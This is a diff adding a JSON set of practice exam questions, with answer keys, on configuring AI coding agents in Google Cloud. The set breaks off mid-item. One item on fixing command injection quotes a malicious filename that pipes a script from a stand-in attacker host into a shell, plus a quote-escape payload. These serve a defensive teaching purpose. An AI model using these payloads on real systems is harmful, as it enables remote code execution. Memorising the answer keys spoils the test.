@@ -1,0 +1,737 @@
+[
+  {
+    "id": "d2-cod-076",
+    "domain": 2,
+    "topic": "Antigravity SDK Streaming & Long-Running Tool Execution",
+    "difficulty": "medium",
+    "type": "single",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "You are embedding an Antigravity coding agent into an internal web IDE using the Antigravity SDK. When the agent executes a comprehensive C++ integration test suite via a custom tool, the build takes 4 minutes. By default, the web UI appears frozen because no HTTP response packets are sent until the tool finishes, causing reverse-proxy idle timeouts (HTTP 504). How should you configure the Antigravity SDK tool handler to prevent timeouts and provide real-time developer feedback?",
+    "options": [
+      "Implement an asynchronous streaming tool handler in the Antigravity SDK that emits incremental `onToolProgress` / Server-Sent Events (SSE) chunk updates (streaming compiler stdout lines) back to the web client while maintaining heartbeat keep-alives.",
+      "Reduce the C++ compiler timeout to 500 milliseconds so every build fails immediately.",
+      "Disable all reverse proxies and expose the internal database directly to the user's browser.",
+      "Ask the developer to refresh their browser every 2 seconds for 4 minutes."
+    ],
+    "answer": [
+      0
+    ],
+    "explanation": "The Antigravity SDK supports streaming tool execution callbacks (`onToolProgress` / SSE streaming). Emitting incremental stdout chunks and keep-alive heartbeats keeps the HTTP connection active across load balancers and proxies while giving developers live visibility into test progress.",
+    "whyWrong": {
+      "1": "A 500ms timeout guarantees that legitimate C++ builds fail before compilation completes.",
+      "2": "Exposing internal databases directly to browsers is a severe security violation and does not solve HTTP proxy timeouts.",
+      "3": "Refreshing the browser drops the active session context and restarts the request."
+    },
+    "refs": [
+      "https://cloud.google.com/agent-builder/docs",
+      "https://cloud.google.com/load-balancing/docs/https#timeout_and_retry_settings"
+    ]
+  },
+  {
+    "id": "d2-cod-077",
+    "domain": 2,
+    "topic": "Claude Code Permission Modes & Sandbox Execution",
+    "difficulty": "medium",
+    "type": "single",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "Your engineering team uses Claude Code on Google Cloud in two distinct environments: (1) interactively on developers' persistent Cloud Workstations where accidental file overwrites could affect local uncommitted work, and (2) inside isolated, single-use ephemeral GKE Sandbox containers running automated nightly bug-fix workflows. How should you configure Claude Code permission modes for each environment to balance safety and automation?",
+    "options": [
+      "Enable `--dangerously-skip-permissions` globally on all developer workstations connected to production databases.",
+      "Use default interactive permission mode (or `acceptEdits` with bash confirmation) on persistent Cloud Workstations, and use `--dangerously-skip-permissions` (or headless auto-approve mode) strictly inside the isolated, network-restricted ephemeral GKE Sandbox containers.",
+      "Require interactive human confirmation prompts inside headless nightly CI/CD containers so every pipeline hangs indefinitely.",
+      "Disable all file read permissions in both environments so Claude Code cannot see the source code."
+    ],
+    "answer": [
+      1
+    ],
+    "explanation": "In persistent developer environments with broad credentials, interactive permission confirmation prevents unintended destructive shell commands. Conversely, inside strongly isolated, ephemeral GKE Sandbox containers with no production credentials and strict NetworkPolicies, bypassing interactive prompts (`--dangerously-skip-permissions`) enables full autonomous CI/CD execution safely.",
+    "whyWrong": {
+      "0": "Running unrestricted auto-approve mode on persistent workstations with production access risks severe accidental damage.",
+      "2": "Interactive prompts in headless CI/CD pipelines cause jobs to hang until they time out.",
+      "3": "Blocking file read permissions prevents the coding agent from analyzing code or fixing bugs."
+    },
+    "refs": [
+      "https://docs.anthropic.com/en/docs/agents-and-tools/claude-code/security",
+      "https://cloud.google.com/kubernetes-engine/docs/concepts/sandbox-pods"
+    ]
+  },
+  {
+    "id": "d2-cod-078",
+    "domain": 2,
+    "topic": "Google Cloud Error Reporting & Logging MCP Server",
+    "difficulty": "medium",
+    "type": "single",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "A microservice team wants their Antigravity coding agents to autonomously investigate production exceptions reported in Google Cloud Error Reporting, locate the offending source file and line number, and propose a fix. However, the coding agents must only query logs from the `prod-checkout-service` log group and must not be able to query audit logs (`cloudaudit.googleapis.com`) or logs from other business units. How should you configure the Cloud Logging MCP server?",
+    "options": [
+      "Grant the MCP server `roles/logging.admin` and `roles/owner` across the entire Google Cloud Organization.",
+      "Download all organization logs into a public Google Sheet every hour.",
+      "Configure a Google Cloud Logging View restricted to `resource.type=\"cloud_run_revision\" AND resource.labels.service_name=\"prod-checkout-service\"`, grant the MCP server's service account `roles/logging.viewAccessor` scoped strictly to that Log View, and expose it via the MCP server.",
+      "Instruct the agent to SSH into production containers and run `cat /var/log/messages` as root."
+    ],
+    "answer": [
+      2
+    ],
+    "explanation": "Google Cloud Logging Views allow administrators to define fine-grained filter expressions over log buckets. Granting `roles/logging.viewAccessor` on a dedicated Log View restricts the MCP server—and any connected coding agent—exclusively to log entries matching `prod-checkout-service`, preventing access to Cloud Audit Logs or other tenants' data.",
+    "whyWrong": {
+      "0": "Granting `roles/logging.admin` at the Organization level violates least privilege and exposes sensitive audit logs across all business units.",
+      "1": "Public Google Sheets expose production stack traces and customer data to unauthorized internet users.",
+      "3": "Cloud Run containers are stateless/serverless and should never be accessed via root SSH in production."
+    },
+    "refs": [
+      "https://cloud.google.com/logging/docs/access-control#log-views",
+      "https://modelcontextprotocol.io/docs"
+    ]
+  },
+  {
+    "id": "d2-cod-079",
+    "domain": 2,
+    "topic": "Confidential GKE Nodes & Container Threat Detection",
+    "difficulty": "hard",
+    "type": "multi",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "A quantitative hedge fund uses autonomous coding agents on GKE to develop and backtest proprietary trading algorithms worth hundreds of millions of dollars. The CISO mandates that: (1) all source code and agent memory in RAM must remain hardware-encrypted even against physical memory-scraping attacks in the cloud data center, and (2) any anomalous runtime behavior inside the coding agent sandbox (such as executing unexpected binaries from `/tmp` or spawning reverse shells) must trigger real-time kernel-level security alerts. Which two Google Cloud security capabilities should you enable on the GKE cluster? (Choose two.)",
+    "options": [
+      "Deploy the coding agent node pools using Confidential GKE Nodes backed by AMD SEV-SNP or Intel TDX hardware memory encryption.",
+      "Store the trading algorithm source code in plaintext inside public GitHub gists.",
+      "Enable Security Command Center Container Threat Detection on the GKE cluster to monitor Linux kernel syscalls (`execve`, `connect`) and detect malicious binary execution or reverse shells in real time.",
+      "Disable all GKE system logging and monitoring agents to save 2% CPU overhead.",
+      "Run all containers with `hostPID: true` so processes share the host process table."
+    ],
+    "answer": [
+      0,
+      2
+    ],
+    "explanation": "Confidential GKE Nodes leverage AMD SEV-SNP or Intel TDX hardware root-of-trust to encrypt VM and container memory in RAM with per-VM keys, protecting proprietary source code in use. Security Command Center Container Threat Detection instruments the GKE node kernel to detect anomalous runtime events like execution of binaries written to `/tmp` (`AddedBinaryExecuted`) or unexpected outbound reverse shells.",
+    "whyWrong": {
+      "1": "Public GitHub gists expose proprietary trading algorithms to the entire world.",
+      "3": "Disabling system monitoring blinds security teams to active container compromises.",
+      "4": "Setting `hostPID: true` breaks process isolation and allows containers to inspect host processes."
+    },
+    "refs": [
+      "https://cloud.google.com/kubernetes-engine/docs/concepts/confidential-nodes",
+      "https://cloud.google.com/security-command-center/docs/concepts-container-threat-detection-overview"
+    ]
+  },
+  {
+    "id": "d2-cod-080",
+    "domain": 2,
+    "topic": "Custom Skills for Automated API SDK Generation",
+    "difficulty": "medium",
+    "type": "single",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "Whenever your backend team updates an OpenAPI 3.1 specification (`api/openapi.yaml`), they must regenerate TypeScript, Python, and Go client SDKs, run type-checkers across all three SDK directories, update `CHANGELOG.md` based on semantic diff severity, and open a pull request. Developers frequently forget one of the languages or miscalculate the SemVer bump. How should you standardize this workflow for Antigravity coding agents?",
+    "options": [
+      "Ask developers to manually translate OpenAPI YAML into Python and Go code by hand every Friday afternoon.",
+      "Instruct the LLM to hallucinate client SDK code from scratch without running a code generator or type checker.",
+      "Delete the Python and Go SDKs so external customers can only use curl.",
+      "Create a version-controlled `SKILL.md` file (`generate-client-sdks`) that defines the deterministic sequence: run `openapi-generator-cli` for TS/Python/Go via MCP, execute language-specific type-checkers (`tsc --noEmit`, `mypy`, `go vet`), compute SemVer bump from breaking changes, and format `CHANGELOG.md`."
+    ],
+    "answer": [
+      3
+    ],
+    "explanation": "Packaging multi-step deterministic engineering workflows into a `SKILL.md` file ensures that whenever an agent is asked to update SDKs, it executes the exact code generator CLI tools, verifies type safety across all target languages (`tsc`, `mypy`, `go vet`), and applies consistent SemVer changelog rules.",
+    "whyWrong": {
+      "0": "Manual hand-translation of API specs is slow, error-prone, and introduces subtle serialization bugs.",
+      "1": "Generating thousands of lines of boilerplate SDK code purely via LLM token generation without deterministic codegen tools wastes tokens and risks hallucinations.",
+      "2": "Deleting supported client SDKs breaks external customer integrations."
+    },
+    "refs": [
+      "https://openapi-generator.tech/",
+      "https://cloud.google.com/agent-builder/docs"
+    ]
+  },
+  {
+    "id": "d2-cod-081",
+    "domain": 2,
+    "topic": "Extension Hooks Protecting Immutable Infrastructure Files",
+    "difficulty": "medium",
+    "type": "single",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "In a repository containing both application code and Terraform infrastructure definitions, developers use Antigravity coding agents to add new application features. However, security policy strictly prohibits coding agents from directly modifying `terraform.tfstate` files, production secret files (`*.pem`, `*.key`), or the production deployment workflow (`.github/workflows/prod-deploy.yml`). How should you enforce this file-level write protection?",
+    "options": [
+      "Configure a pre-tool extension hook on all file-modification tools (`write_to_file`, `replace_file_content`, `bash`) that checks the target file path against a protected path blocklist (`*.tfstate`, `*.pem`, `.github/workflows/prod-deploy.yml`) and immediately rejects the tool call with exit code 1 if matched.",
+      "Put a comment at the top of `terraform.tfstate` saying `# Please do not edit me`.",
+      "Delete all `.tfstate` files from the repository and cloud bucket so Terraform forgets what infrastructure exists.",
+      "Allow the coding agent to edit `prod-deploy.yml` freely and rely on yearly audits to notice changes."
+    ],
+    "answer": [
+      0
+    ],
+    "explanation": "A pre-tool extension hook inspects target file paths before any disk write occurs. Matching against a protected path blocklist deterministically blocks unauthorized edits to state files, keys, and CI/CD workflows regardless of LLM hallucination or prompt injection.",
+    "whyWrong": {
+      "1": "Comments inside JSON state files are ignored by file-write tools and break JSON syntax if `terraform.tfstate` is parsed.",
+      "2": "Deleting Terraform state files disconnects Terraform from live cloud infrastructure, causing catastrophic state loss.",
+      "3": "Allowing unverified edits to production deployment workflows enables CI/CD privilege escalation."
+    },
+    "refs": [
+      "https://developer.hashicorp.com/terraform/language/state",
+      "https://cloud.google.com/agent-builder/docs"
+    ]
+  },
+  {
+    "id": "d2-cod-082",
+    "domain": 2,
+    "topic": "Subagent Cross-Repository Dependency Impact Analysis",
+    "difficulty": "hard",
+    "type": "single",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "You maintain a core authentication library (`auth-core`) used by 18 downstream microservice repositories across your organization. Before changing the signature of `ValidateToken()` in `auth-core`, you want your Antigravity coding agent to analyze how all 18 downstream repositories call `ValidateToken()`, identify any breaking usage patterns, and generate migration patches for each affected downstream repo. How should you architect this workflow?",
+    "options": [
+      "Change `ValidateToken()` in `auth-core`, publish a major release immediately, and wait for all 18 downstream services to crash in production.",
+      "Configure a parent orchestrator agent that queries an enterprise Code Search / Sourcegraph MCP server to locate all call sites across the 18 repositories, and then spawns parallel subagents—one per affected downstream repository—to clone, apply the call-site refactor, run local tests, and submit linked draft PRs.",
+      "Load all 18 repositories (totaling 12 GB of source code) into a single LLM prompt context window.",
+      "Ask the coding agent to guess which repositories might use `ValidateToken()` based solely on repository names."
+    ],
+    "answer": [
+      1
+    ],
+    "explanation": "Combining a cross-repository Code Search MCP server (to accurately discover call sites across the organization) with parallel repository-scoped subagents allows each downstream microservice to be refactored and tested concurrently in its own isolated context window.",
+    "whyWrong": {
+      "0": "Breaking downstream production services violates backward compatibility and engineering reliability standards.",
+      "2": "12 GB of source code vastly exceeds any LLM context window.",
+      "3": "Guessing dependencies by repo name misses transitive callers and causes incomplete migrations."
+    },
+    "refs": [
+      "https://modelcontextprotocol.io/docs",
+      "https://cloud.google.com/agent-builder/docs"
+    ]
+  },
+  {
+    "id": "d2-cod-083",
+    "domain": 2,
+    "topic": "Cloud Workstations Disaster Recovery & Snapshots",
+    "difficulty": "easy",
+    "type": "single",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "Engineers store active work-in-progress branches, local Antigravity configuration files, and custom test datasets in their `/home` directories on Cloud Workstations persistent disks. Your enterprise Business Continuity & Disaster Recovery (BCDR) policy requires that if a developer accidentally runs a destructive script or if a zonal outage occurs, any developer's `/home` disk can be restored to a point-in-time state within the last 7 days with zero manual backup effort from developers. What should you configure?",
+    "options": [
+      "Ask every developer to email themselves a `.zip` archive of their home directory every evening.",
+      "Use ephemeral local SSD scratch disks without snapshots so data is permanently lost on every VM stop.",
+      "Attach a Compute Engine Persistent Disk Snapshot Schedule (configured for daily regional snapshots with a 7-day retention policy) to the persistent disk template in the Cloud Workstations Configuration.",
+      "Print out developers' source code on dot-matrix printers every Friday."
+    ],
+    "answer": [
+      2
+    ],
+    "explanation": "Cloud Workstations persistent home directories reside on Compute Engine Persistent Disks (or Hyperdisks). Attaching an automated regional Snapshot Schedule to these disks provides transparent, point-in-time block-level backups that can be restored across zones without developer intervention.",
+    "whyWrong": {
+      "0": "Manual email zip backups fail due to attachment size limits, human forgetfulness, and security policy violations.",
+      "1": "Local SSD scratch disks lose all data when a workstation stops, violating persistence and BCDR requirements.",
+      "3": "Paper printouts cannot restore binary state, Git objects, or developer configurations."
+    },
+    "refs": [
+      "https://cloud.google.com/compute/docs/disks/scheduled-snapshots",
+      "https://cloud.google.com/workstations/docs/architecture"
+    ]
+  },
+  {
+    "id": "d2-cod-084",
+    "domain": 2,
+    "topic": "Agents CLI FinOps & Model Routing Governance",
+    "difficulty": "hard",
+    "type": "multi",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "An enterprise FinOps audit revealed that coding agents across 50 engineering teams are using expensive frontier reasoning models (`gemini-2.5-pro` / `claude-3-7-sonnet` with extended thinking) for every single task—including trivial operations like fixing typos, generating commit messages, and formatting JSON files—resulting in $180,000/month in unnecessary LLM spend. Using the Agents CLI and Google Cloud Agent Platform, which two FinOps optimization policies should you implement? (Choose two.)",
+    "options": [
+      "Enforce per-team daily token budgets and cost-center quota caps via Agents CLI policies, alerting team leads at 80% utilization and automatically throttling or downgrading model tiers if 100% of the daily budget is exceeded.",
+      "Configure intelligent model routing rules in the Agents CLI / Agent Gateway policy manifest that automatically route lightweight tasks (commit message generation, syntax formatting, file summarization) to cost-efficient models (`gemini-2.5-flash` / `claude-3-5-haiku`) while reserving frontier models for complex multi-file architectural refactoring.",
+      "Delete all unit tests in the company so coding agents use fewer tokens running test suites.",
+      "Ban all software engineers from using computers on Tuesdays and Thursdays to cut cloud bills by 40%.",
+      "Configure coding agents to send every prompt simultaneously to 5 different frontier LLMs and discard 4 of the responses."
+    ],
+    "answer": [
+      0,
+      1
+    ],
+    "explanation": "Agentic FinOps best practices combine task-aware tiered model routing (matching model capability and cost to task complexity: Flash/Haiku for routine tasks, Pro/Sonnet for complex reasoning) with declarative token budget enforcement and automated tier downgrading governed centrally via the Agents CLI.",
+    "whyWrong": {
+      "2": "Deleting unit tests introduces severe production defects and regressions.",
+      "3": "Halting engineering work two days a week destroys business velocity and costs far more in lost developer productivity.",
+      "4": "Querying 5 frontier models simultaneously multiplies LLM token costs by 5x."
+    },
+    "refs": [
+      "https://cloud.google.com/agent-builder/docs",
+      "https://cloud.google.com/vertex-ai/generative-ai/docs/learn/models"
+    ]
+  },
+  {
+    "id": "d2-cod-085",
+    "domain": 2,
+    "topic": "Patching OS Command Injection Vulnerabilities (CWE-78)",
+    "difficulty": "medium",
+    "type": "single",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "A Python microservice converts user-uploaded PDF invoices to PNG thumbnails using the following code:\n```python\nos.system(f\"pdftoppm -png -r 150 {user_filename} output_prefix\")\n```\nA penetration tester demonstrated that uploading a file named `invoice.pdf; curl http://attacker.com/shell.sh | sh #` executes arbitrary OS commands on the container. How should your Antigravity coding agent remediate this CWE-78 vulnerability?",
+    "options": [
+      "Keep `os.system()` but wrap the string in single quotes `'{user_filename}'`.",
+      "Add a comment `# nosec` above `os.system()` so Bandit SAST stops reporting the vulnerability.",
+      "Run the Python web server as `root` so `pdftoppm` runs faster.",
+      "Replace `os.system()` string interpolation with `subprocess.run([\"pdftoppm\", \"-png\", \"-r\", \"150\", safe_path, \"output_prefix\"], shell=False, check=True)` after validating that `safe_path` is a server-generated UUID filename inside a restricted directory."
+    ],
+    "answer": [
+      3
+    ],
+    "explanation": "Passing an argument array to `subprocess.run(..., shell=False)` invokes the OS `execve()` syscall directly without spawning a `/bin/sh` shell interpreter, making shell metacharacter injection (`;`, `|`, `&&`, backticks) impossible. Combining this with server-generated UUID filenames eliminates path and argument injection.",
+    "whyWrong": {
+      "0": "Single quotes inside shell strings are trivially bypassed by filenames containing a single quote (e.g., `foo'; reboot #'`).",
+      "1": "Suppressing SAST warnings with `# nosec` leaves the critical RCE vulnerability active in production.",
+      "2": "Running as root gives any injected command full superuser privileges over the container."
+    },
+    "refs": [
+      "https://owasp.org/www-community/attacks/Command_Injection",
+      "https://docs.python.org/3/library/subprocess.html#security-considerations"
+    ]
+  },
+  {
+    "id": "d2-cod-086",
+    "domain": 2,
+    "topic": "Frontend Bundle & Core Web Vitals Optimization",
+    "difficulty": "medium",
+    "type": "single",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "An e-commerce storefront built with React and Next.js suffers from poor Largest Contentful Paint (LCP > 4.2s) and Interaction to Next Paint (INP > 500ms) because the main JavaScript bundle exceeds 3.8 MB uncompressed. You task an Antigravity coding agent with optimizing the frontend codebase. How should you configure the agent to systematically reduce bundle size and improve Core Web Vitals?",
+    "options": [
+      "Equip the coding agent with an MCP tool that runs `@next/bundle-analyzer` and Lighthouse CI, instructing it to eliminate barrel file re-exports (`index.ts`), replace full library imports (`import _ from 'lodash'`) with modular tree-shakeable imports, and wrap heavy below-the-fold modals in `next/dynamic` lazy loading.",
+      "Instruct the agent to delete all CSS styles and product images from the e-commerce site.",
+      "Have the agent base64-encode all 50 MB of product videos directly inside the main `app.js` file.",
+      "Ask the agent to disable gzip/Brotli compression on Cloud CDN."
+    ],
+    "answer": [
+      0
+    ],
+    "explanation": "Providing empirical bundle analysis (`@next/bundle-analyzer`) and Lighthouse metrics allows the coding agent to identify the exact modules bloating initial page load. Refactoring barrel files (which defeat bundler tree-shaking), switching to modular imports, and applying route/component code splitting (`next/dynamic`) directly lowers JS parse/execution time and improves LCP/INP.",
+    "whyWrong": {
+      "1": "Deleting product images and styles breaks the e-commerce user experience and business conversion.",
+      "2": "Base64-encoding videos into JavaScript bundles bloats bundle size by 33% and blocks main-thread execution.",
+      "3": "Disabling Brotli/gzip compression increases network transfer sizes by 70-80%."
+    },
+    "refs": [
+      "https://nextjs.org/docs/app/building-your-application/optimizing/package-bundling",
+      "https://web.dev/articles/vitals"
+    ]
+  },
+  {
+    "id": "d2-cod-087",
+    "domain": 2,
+    "topic": "Antigravity CLI Diff Review & Interactive Governance",
+    "difficulty": "easy",
+    "type": "single",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "A junior developer is using the Antigravity CLI on their workstation to refactor an authentication controller. To prevent the junior developer from blindly accepting multi-file edits that might weaken password hashing logic, the team lead wants the CLI to display a colorized unified Git diff for every proposed file change and require explicit interactive approval (`[y/n/edit]`) before any file is modified on disk. Which configuration enforces this?",
+    "options": [
+      "Run Antigravity CLI with `--yolo --force --no-confirm` flags enabled by default in `~/.bashrc`.",
+      "Run Antigravity CLI with interactive diff review enabled (`approval_mode: interactive` / omitting `--auto-approve`) so every `replace_file_content` or `write_to_file` action displays an inline diff preview requiring developer confirmation.",
+      "Unplug the developer's monitor so they cannot see the code diff.",
+      "Delete the authentication controller file so no one can edit it."
+    ],
+    "answer": [
+      1
+    ],
+    "explanation": "Antigravity CLI's default interactive approval mode intercepts file-mutating tool calls, renders a unified diff of the proposed additions and deletions in the terminal, and waits for explicit user confirmation (`y` to apply, `n` to reject with feedback, or `e` to edit) before touching disk.",
+    "whyWrong": {
+      "0": "Auto-approve / `--yolo` flags bypass interactive diff review and apply all edits autonomously.",
+      "2": "Unplugging monitors prevents code review entirely.",
+      "3": "Deleting critical source files breaks application functionality."
+    },
+    "refs": [
+      "https://cloud.google.com/agent-builder/docs",
+      "https://docs.anthropic.com/en/docs/agents-and-tools/claude-code/overview"
+    ]
+  },
+  {
+    "id": "d2-cod-088",
+    "domain": 2,
+    "topic": "MCP Sampling Capability & Human-in-the-Loop",
+    "difficulty": "hard",
+    "type": "single",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "You are developing an advanced Google Cloud Spanner MCP Server that helps developers optimize complex SQL queries. When the MCP server detects a suboptimal query plan, the server itself needs to ask an LLM to synthesize a natural-language explanation of the Spanner execution tree without requiring the MCP server to manage its own separate Vertex AI API credentials or billing project. Which Model Context Protocol feature enables the MCP server to request an LLM completion from the connected coding agent client?",
+    "options": [
+      "MCP Unauthenticated Telnet Reverse Execution.",
+      "Hardcoding the developer's personal credit card number inside the MCP server binary.",
+      "MCP Sampling (`sampling/createMessage`), which allows the MCP server to send a structured prompt request back to the connected coding agent client (subject to client human-in-the-loop approval controls) and receive the generated LLM response.",
+      "Sending an SNMP trap packet to port 161 on the developer's home router."
+    ],
+    "answer": [
+      2
+    ],
+    "explanation": "In the Model Context Protocol (MCP) specification, `sampling/createMessage` allows an MCP server to request an LLM completion from the client host (e.g., Antigravity or Claude Code). This keeps LLM credentials, model selection, token billing, and human-in-the-loop prompt review centralized in the client application.",
+    "whyWrong": {
+      "0": "MCP does not use unauthenticated telnet reverse execution.",
+      "1": "Hardcoding personal credit card numbers in server binaries is a severe security and compliance violation.",
+      "3": "SNMP traps are network monitoring notifications incapable of requesting LLM completions."
+    },
+    "refs": [
+      "https://modelcontextprotocol.io/docs/concepts/sampling",
+      "https://cloud.google.com/agent-builder/docs"
+    ]
+  },
+  {
+    "id": "d2-cod-089",
+    "domain": 2,
+    "topic": "Cloud Workstations Startup Hooks & Daemon Initialization",
+    "difficulty": "medium",
+    "type": "multi",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "You maintain a custom Cloud Workstations container image for your data science and engineering teams. Every time a developer starts their workstation VM, you need the environment to automatically: (1) configure Git to authenticate seamlessly to Cloud Source Repositories / private Git mirrors using the workstation's Google Cloud identity without SSH key files, and (2) start a local background MCP server daemon for SQLite/DuckDB analysis before the developer opens their IDE. Which two configuration steps should you implement in your custom workstation image? (Choose two.)",
+    "options": [
+      "Ask developers to manually compile Git from C source code every morning before checking out branches.",
+      "Place an executable shell script inside `/etc/workstation-startup.d/` (such as `010-init-agent-env.sh`) that runs automatically during container initialization whenever the workstation VM boots.",
+      "Within the startup script, configure the Google Cloud Git credential helper (`git config --global credential.helper gcloud.sh`) and launch the local MCP server daemon under `systemd` / `supervisord` or background process management.",
+      "Modify the BIOS firmware on Google Cloud physical data center servers.",
+      "Store plaintext GitHub personal access tokens inside `/etc/motd` visible to all users."
+    ],
+    "answer": [
+      1,
+      2
+    ],
+    "explanation": "Cloud Workstations executes scripts located in `/etc/workstation-startup.d/` in lexical order every time a workstation container starts. Using this startup hook to configure `credential.helper gcloud.sh` enables keyless IAM-backed Git authentication, while starting background MCP daemons ensures tools are immediately ready when the IDE loads.",
+    "whyWrong": {
+      "0": "Compiling Git from source daily wastes time and does not configure authentication.",
+      "3": "Customers cannot and should not modify physical server BIOS firmware in Google Cloud.",
+      "4": "Storing plaintext personal access tokens in `/etc/motd` exposes credentials to unauthorized access."
+    },
+    "refs": [
+      "https://cloud.google.com/workstations/docs/custom-container-images#startup-scripts",
+      "https://cloud.google.com/source-repositories/docs/authentication"
+    ]
+  },
+  {
+    "id": "d2-cod-090",
+    "domain": 2,
+    "topic": "Custom Skills for Database Deadlock Remediation",
+    "difficulty": "hard",
+    "type": "single",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "An order-fulfillment microservice intermittently throws PostgreSQL `DeadlockDetected (SQLSTATE 40P01)` exceptions under high concurrency when updating `orders` and `inventory_items` tables. You want an Antigravity coding agent to systematically diagnose and fix these deadlocks across your repository. How should you design a custom skill (`SKILL.md`) for this task?",
+    "options": [
+      "Instruct the agent to catch `DeadlockDetected` exceptions and silently return `HTTP 200 OK` to the customer even though the order failed.",
+      "Have the agent set `max_connections = 1` in PostgreSQL so only one user can use the website at a time.",
+      "Ask the agent to remove all database transactions (`BEGIN` / `COMMIT`) so partial corrupt updates are written to disk.",
+      "Author a `postgres-deadlock-resolver` skill that instructs the agent to inspect PostgreSQL deadlock log graphs (`DETAIL: Process X waits for ShareLock on transaction Y`), locate the conflicting transaction code paths in the repository, and refactor both transactions to acquire row locks in a consistent deterministic primary-key order (`SELECT ... FOR UPDATE ORDER BY id ASC`)."
+    ],
+    "answer": [
+      3
+    ],
+    "explanation": "Database deadlocks occur when concurrent transactions acquire locks on multiple resources in opposing orders (e.g., Tx1 locks Order A then Item B, while Tx2 locks Item B then Order A). A specialized `SKILL.md` guides the coding agent to parse the deadlock wait-for graph from logs and enforce a canonical lock acquisition ordering (`ORDER BY id ASC`) across all transaction blocks.",
+    "whyWrong": {
+      "0": "Silently returning `HTTP 200 OK` on failed database transactions causes lost orders and severe financial discrepancies.",
+      "1": "Setting `max_connections = 1` destroys concurrency and causes immediate site-wide outages under load.",
+      "2": "Removing transactions violates ACID guarantees and leads to corrupted inventory counts."
+    },
+    "refs": [
+      "https://www.postgresql.org/docs/current/explicit-locking.html#LOCKING-DEADLOCKS",
+      "https://cloud.google.com/sql/docs/postgres"
+    ]
+  },
+  {
+    "id": "d2-cod-091",
+    "domain": 2,
+    "topic": "Extension Hooks for Flaky Test Quarantine & Issue Tracking",
+    "difficulty": "medium",
+    "type": "single",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "Your engineering team uses Antigravity coding agents to run local and CI test suites (`pytest` / `go test`). Developers notice that when a test fails on the first run but passes on an immediate retry without code changes (a flaky test), the coding agent ignores the flake and moves on, leaving the test suite unstable for future developers. How should you automate flaky test tracking without slowing down the agent's primary feature work?",
+    "options": [
+      "Configure a post-tool extension hook on test runner invocations that inspects the structured test report (JUnit XML / JSON); if a test exhibits pass-after-fail retry behavior, the hook asynchronously invokes an MCP Issue Tracker tool to create/update a labeled `flaky-test` issue with stack traces while allowing the agent session to proceed.",
+      "Configure the coding agent to automatically delete any test file that ever fails once.",
+      "Stop running tests entirely so developers never encounter flaky tests.",
+      "Require the coding agent to rewrite the entire operating system whenever a network timeout occurs in a test."
+    ],
+    "answer": [
+      0
+    ],
+    "explanation": "A post-tool extension hook inspecting structured test runner output can deterministically detect pass-on-retry flaky behavior and asynchronously file a detailed issue via an MCP issue-tracker integration, capturing diagnostic evidence without derailing the coding agent's active development task.",
+    "whyWrong": {
+      "1": "Automatically deleting failing tests destroys test coverage and hides real regressions.",
+      "2": "Stopping test execution eliminates quality assurance.",
+      "3": "Rewriting OS components for a transient test flake is absurd and destructive."
+    },
+    "refs": [
+      "https://cloud.google.com/agent-builder/docs",
+      "https://docs.pytest.org/"
+    ]
+  },
+  {
+    "id": "d2-cod-092",
+    "domain": 2,
+    "topic": "Workspace Rules for Cryptographic Standards Compliance",
+    "difficulty": "medium",
+    "type": "single",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "A financial technology company is undergoing a PCI-DSS 4.0 compliance audit. The auditors require that no application code use deprecated cryptographic primitives (`MD5`, `SHA-1`, `DES`, `AES-ECB`, or non-cryptographic PRNGs like Go's `math/rand` or Python's `random` for token generation). Instead, all code must use `AES-GCM-256`, `SHA-256/512`, `Argon2id` for password hashing, and OS CSPRNGs (`crypto/rand`, `secrets`). How should you ensure coding agents enforce this standard across all repositories?",
+    "options": [
+      "Ask the coding agent to invent its own custom encryption algorithm using bit-shifting.",
+      "Define mandatory cryptographic rules in `.antigravity/rules.md` specifying approved algorithms (`AES-GCM-256`, `Argon2id`, `crypto/rand`) and bind a pre-commit / post-edit extension hook running custom Semgrep cryptographic rules that blocks any commit containing prohibited crypto imports or functions.",
+      "Store all user passwords in plaintext in a public Cloud Storage bucket so no hashing algorithm is used.",
+      "Rely on developers visually scanning 50,000 lines of agent-generated code for `math/rand` imports."
+    ],
+    "answer": [
+      1
+    ],
+    "explanation": "Pairing explicit workspace rules (`.antigravity/rules.md`)—which steer the LLM to select `AES-GCM-256`, `Argon2id`, and `crypto/rand` during generation—with a deterministic Semgrep AST pre-commit extension hook guarantees both proactive compliance and hard enforcement against weak cryptography.",
+    "whyWrong": {
+      "0": "Custom homegrown encryption algorithms violate cryptographic best practices and PCI-DSS standards.",
+      "2": "Storing plaintext passwords in public buckets is a catastrophic security breach.",
+      "3": "Visual human scanning across large diffs is error-prone and misses subtle `math/rand` vs `crypto/rand` imports."
+    },
+    "refs": [
+      "https://owasp.org/www-project-web-security-testing-guide/",
+      "https://semgrep.dev/docs/"
+    ]
+  },
+  {
+    "id": "d2-cod-093",
+    "domain": 2,
+    "topic": "Subagent Competitive Ensemble Pattern (Best-of-N)",
+    "difficulty": "hard",
+    "type": "single",
+    "caseStudy": null,
+    "officialSample": false,
+    "question": "You need an Antigravity coding agent to optimize a critical vehicle routing optimization function written in Rust. Multiple algorithmic approaches exist (e.g., Simulated Annealing, Tabu Search with SIMD vectorization, and Genetic Algorithms), and it is impossible to know a priori which algorithm will achieve the lowest latency and highest solution quality on your production dataset. How should you leverage subagents to discover and select the optimal implementation?",
+    "options": [
+      "Have a single agent write all 3 algorithms into the same function so every request runs 3 times slower.",
+      "Pick one algorithm at random without running benchmarks and delete the test dataset.",
